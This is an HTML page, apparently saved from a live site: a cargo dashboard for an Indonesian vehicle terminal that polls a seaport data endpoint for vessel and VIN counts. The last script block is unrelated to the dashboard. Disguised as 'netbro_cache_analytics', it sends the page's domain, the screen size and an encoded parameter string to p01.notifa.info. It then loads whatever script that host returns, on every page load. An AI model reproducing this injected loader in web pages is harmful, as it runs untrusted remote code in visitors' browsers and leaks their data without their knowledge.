<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="">
  <meta name="author" content="">
  <title>Dashboard</title>
  <link href="http://seaport.tpsonline.co.id/dashboard/assets/vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Nunito:200,200i,300,300i,400,400i,600,600i,700,700i,800,800i,900,900i" rel="stylesheet">
  <link href="http://seaport.tpsonline.co.id/dashboard/assets/css/sb-admin-2.min.css" rel="stylesheet">
</head>

<body id="page-top">
  <div id="wrapper">
    <div id="content-wrapper" class="d-flex flex-column">
      <div id="content">
        <nav class="navbar navbar-expand navbar-light bg-white topbar mb-4 static-top shadow">
        </nav>
        <div class="container-fluid">
          <div class="d-sm-flex align-items-center justify-content-between mb-4">
            <h2 class="h3 mb-0 text-gray-800 text-left">
              <img src="http://seaport.tpsonline.co.id/dashboard/assets/img/logo_ipc.png" height="100px">
              PT. INDONESIA KENDARAAN TERMINAL
            </h2>
            <div class="row">
              <div class="col-lg-12">
                <h3 id="clock">29-Aug-2019</h3>
              </div>
            </div>
          </div>
          <!--<div class="row">
            <div class="col-xl-6 col-lg-7">
              <div class="card border-left-warning mb-4">
                <div class="card-header py-3 d-flex flex-row align-items-center justify-content-between">
                  <h6 class="m-0 font-weight-bold text-warning">CAMERA</h6>
                </div>
                <div class="card-body">
                  <div id="images" style="text-align: center;">
                  </div>
                </div>
              </div>
            </div>
            <div class="col-lg-2 mb-2">
              <div class="card border-left-warning mb-4">
                <div class="card-header py-3">
                  <h6 class="m-0 font-weight-bold text-warning">kapal</h6>
                </div>
                <div class="card-body text-center" style="height: 450px;">
                  <div class="col-lg-12" style="padding-top: 20px;">
                    <a href="#" class="btn" id="status" style="height: 14.5rem; width: 16.5rem;"></a>
                    <h1 style="padding-top: inherit;" id="status_failed"></h1>
                    <hr>
                    <h1 id="total_failed"></h1>
                  </div>
                </div>
              </div>
            </div>
            <div class="col-xl-4 col-lg-4">
              <div class="card border-left-warning mb-4">
                <div class="card-header py-3 d-flex flex-row align-items-center justify-content-between">
                  <h6 class="m-0 font-weight-bold text-warning">DATA KAPAL</h6>
                </div>
                <div class="card-body" style="height: 450px;">
                  <div class="row">
                    <div class="col-lg-12 mb-12">
                      <div class="card bg-primary text-white shadow">
                        <div class="card-body">
                          <h3>VESSEL</h3>
                          <h5 class="vessel"></h5>
                        </div>
                      </div>
                    </div>
                    <div class="col-lg-12 mb-12">
                      <div class="card bg-success text-white shadow">
                        <div class="card-body">
                          <h3>LOAD TIME</h3>
                          <h5 class="load_time"></h5>
                        </div>
                      </div>
                    </div>
                    <div class="col-lg-12 mb-12">
                      <div class="card bg-warning text-white shadow">
                        <div class="card-body">
                          <h3>DESTINATION</h3>
                          <h5 class="destination"></h5>
                        </div>
                      </div>
                    </div>
                    <div class="col-lg-12 mb-12">
                      <div class="card bg-danger text-white shadow">
                        <div class="card-body">
                          <h3>NUMBER OF LOADS</h3>
                          <h5 class="jml_loading"></h5>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>--->
          <div class="container">
            <div class="row">
              <div class="col-lg-6 mb-4">
                <div class="card border-left-warning mb-">
                  <div class="card-header py-3">
                    <h6 class="m-0 font-weight-bold text-warning">DATA KAPAL</h6>
                  </div>
                  <div class="card-body">
                    <div class="row">
                      <div class="col-lg-6 mb-4">
                        <div class="card bg-primary text-white shadow">
                          <div class="card-body">
                            <div>Kapal:</div>
                            <div>Voyage:</div>
                            <div>Arival:</div>
                            <div>Complete:</div>
                            <div>Jumlah BL:</div>
                          </div>
                        </div>
                      </div>
                      <div class="col-lg-6 mb-4">
                        <div class="card bg-primary text-white shadow">
                          <div class="card-body">
                            <div>BC. 1.1:</div>
                            <div>Operasional:</div>
                            <div>Departure:</div>
                          </div>
                        </div>
                      </div>
                      <div class="col-lg-12 mb-4">
                        <div class="card  bg-primary text-white shadow">
                          <div class="card-body">
                            <div>Vin :</div>
                            <div>Eksport : </div>
                            <div>Import : </div>
                          </div>
                        </div>
                      </div>
                      <div class="col-lg-12 mb-4">
                        <div class="card  bg-primary text-white shadow">
                          <div class="card-body">
                            <div>Type Vin :</div>
                            <div>CBU : </div>
                            <div>HH : </div>
                            <div>Sperparts : </div>
                          </div>
                        </div>
                      </div>
                      <div class="col-lg-12 mb-4">
                        <div class="card  bg-primary text-white shadow">
                          <div class="card-body">
                            <div>Base On NPE :</div>
                            <div>NPE : </div>
                            <div>Non NPE : </div>
                          </div>
                        </div>
                      </div>
                      <div class="col-lg-12 mb-4">
                        <div class="card  bg-primary text-white shadow">
                          <div class="card-body">
                            <div>Jumlah :</div>
                            <div>Gate in : </div>
                            <div>Loaded : </div>
                            <div>Discharge : </div>
                            <div>Left : </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <div class="row">
                <div class="col-lg-6 mb-4 ">
                  <div class="card border-justify-warning mb-4">
                    <div class="card-header py-3 d-flex flex-row align-items-center right-content-between">
                      <h6 class="m-0 font-weight-bold text-warning">CAMERA</h6>
                    </div>
                    <div class="card-body">
                      <div class="col-lg-12 mb-4">
                        <div class="card  bg-primary text-white shadow">
                          <div class="card-body">
                            <div>Jumlah :</div>
                            <div>Gate in : </div>
                            <div>Loaded : </div>
                            <div>Discharge : </div>
                            <div>Left : </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <!--<div class="col-lg-3 mb-4">
              <div class="card border-left-warning mb-4">
                <div class="card-header py-3">
                  <h6 class="m-0 font-weight-bold text-warning">LOADING STATUS</h6>
                </div>
                <div class="card-body text-center" style="height: 295px;">
                  <h1 class="loading" style="font-size: 12.5rem;"></h1>
                </div>
              </div>
            </div>
              <div class="col-lg-3 mb-4">
                <div class="card border-left-warning mb-4">
                  <div class="card-header py-3">
                    <h6 class="m-0 font-weight-bold text-warning">STORAGE IVENTORY (TOTAL CARGO)</h6>
                  </div>
                  <div class="card-body" style="height: 295px;">
                    <div class="text-center" style="padding-top: 55px;">
                      <h1 class="jml_iventory"></h1>
                      <h5>Jumlah Iventory</h5>
                    </div>
                    <hr>
                    <div class="row text-center">
                      <div class="col-lg-6">
                        <h1>NPE</h1>
                      </div>
                      <div class="col-lg-6">
                        <h1 class="npe"></h1>
                      </div>
                    </div>
                    <div class="row text-center">
                      <div class="col-lg-6">
                        <h1>NON NPE</h1>
                      </div>
                      <div class="col-lg-6">
                        <h1 class="non_npe"></h1>
                      </div>
                    </div>
                  </div>
                </div>
              </div>-->
          </div>
        </div>
      </div>
      <footer class="sticky-footer bg-white">
        <div class="container my-auto">
          <div class="copyright text-center my-auto">
            <span>Copyright &copy; PT. ELECTRONIC DATA INTERCHANGE INDONESIA</span>
          </div>
        </div>
      </footer>
    </div>
  </div>
  <a class="scroll-to-top rounded" href="#page-top">
    <i class="fas fa-angle-up"></i>
  </a>
  <script src="http://seaport.tpsonline.co.id/dashboard/assets/vendor/jquery/jquery.min.js"></script>
  <script src="http://seaport.tpsonline.co.id/dashboard/assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
  <script src="http://seaport.tpsonline.co.id/dashboard/assets/vendor/jquery-easing/jquery.easing.min.js"></script>
  <script src="http://seaport.tpsonline.co.id/dashboard/assets/js/sb-admin-2.min.js"></script>
  <script type="text/javascript">
    $(function() {
      get_dashboard();
    });

    function get_dashboard() {
      setInterval(function() {

        $.ajax({
          type: 'POST',
          url: "http://seaport.tpsonline.co.id/dashboard/index.php/integrasi/get_dashboard",
          data: {
            DATA: 'IVENTORY'
          },
          dataType: 'JSON',
          success: function(data) {
            $(".jml_iventory").html(data[0]['IVENTORY']);
          },
          async: false
        });

        $.ajax({
          type: 'POST',
          url: "http://seaport.tpsonline.co.id/dashboard/index.php/integrasi/get_dashboard",
          data: {
            DATA: 'NPE'
          },
          dataType: 'JSON',
          success: function(data) {
            $(".npe").html(data[0]['NPE']);
          },
          async: false
        });

        $.ajax({
          type: 'POST',
          url: "http://seaport.tpsonline.co.id/dashboard/index.php/integrasi/get_dashboard",
          data: {
            DATA: 'NON NPE'
          },
          dataType: 'JSON',
          success: function(data) {
            $(".non_npe").html(data[0]['NON_NPE']);
          },
          async: false
        });

        $.ajax({
          type: 'POST',
          url: "http://seaport.tpsonline.co.id/dashboard/index.php/integrasi/get_dashboard",
          data: {
            DATA: 'ALL'
          },
          dataType: 'JSON',
          success: function(data) {
            console.log('refresh');
            $(".nomor_vin").html(data[0]['NOMOR_VIN']);
            $(".nomor_npe").html(data[0]['NOMOR_NPE']);
            $(".unit").html(data[0]['UNIT']);
            $(".destination").html(data[0]['TUJUAN']);
            $(".vessel").html(data[0]['VESSEL']);
            $(".load_time").html(data[0]['LOAD_TIME']);
            $(".loading").html(data[0]['LOADING']);
            $(".jml_loading").html(data[0]['JML_CARGO']);
            $("#images").html('<img src="http://10.10.41.35/tes2/images/' + data[0]['NOMOR_VIN'] + '_c1.jpg" style="height:410px;">');
            if (data[0]['ON_OFF'] == 1) {
              $("#status_failed").html('SUCCESS');
              $("#total_failed").html(' ');
              $("#status").html('<a href="#" class="btn btn-success btn-circle btn-lg" id="status" style="height: 14.5rem; width: 14.5rem;"></a>');
            } else {
              $("#status_failed").html('FAILED');
              $("#total_failed").html(data[0]['FAILED']);
              $("#status").html('<a href="#" class="btn btn-danger btn-circle btn-lg" id="status" style="height: 14.5rem; width: 14.5rem;"></a>');
            }
          },
          async: false
        });
      }, 3000);
    }
  </script>
  <script type="text/javascript">
    if (self == top) {
      function netbro_cache_analytics(fn, callback) {
        setTimeout(function() {
          fn();
          callback();
        }, 0);
      }

      function sync(fn) {
        fn();
      }

      function requestCfs() {
        var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
        var idc_glo_r = Math.floor(Math.random() * 99999999999);
        var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2VMSuzq%2f4la9KQLf5%2fgjhHfwK%2f%2bFdSXWzwv1FcsRRPm4BgX31wFCYVQxxSjVDRYtsSpjJJNJNPjwiZ2UH0e4Nw1uwKW6RX66rDnm4RvW2qTBAAUiXfbScuuKCmoWSMAhtIs9iKlIS%2bwXRUOzH5%2b%2bLWIeQM8aoQnNR%2fCe1PQtaPaLTwPio09IOZK7PEmRDN5eOkfCAxKqofvoTmbZlGjP9JDZjTFaovbVD96YT4CEk60JrG0bBXO3YXE0jvyiYmGYKZLe9UX93FGWygo6ULfi3a6HeLQqmbuByamfYMpvHnV6mXnO88tAtKlLlEFz5L9ChI6UechKtn7Bd9kbpjZPqngJCsn4olhkATfXmAQd3zFxiPGHp96hcnf5GMaohUfnP4OhJJE5VJHJcXtALIy9zl0OaBE3vYj3xaJI6zL76gtnSY1aaTjPDnGJ9adLEM35US3PUBVbKVxH34mdmmXMtY8YT3poBy%2bKBsXgZEdRADzL7JvQAJ7WImlat3qQRUsbUJRvr3SJ2ul4TI4qynHxqNdMtapeeoAVz" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
        var bsa = document.createElement('script');
        bsa.type = 'text/javascript';
        bsa.async = true;
        bsa.src = url;
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
      }
      netbro_cache_analytics(requestCfs, function() {});
    };
  </script>
</body>

</html>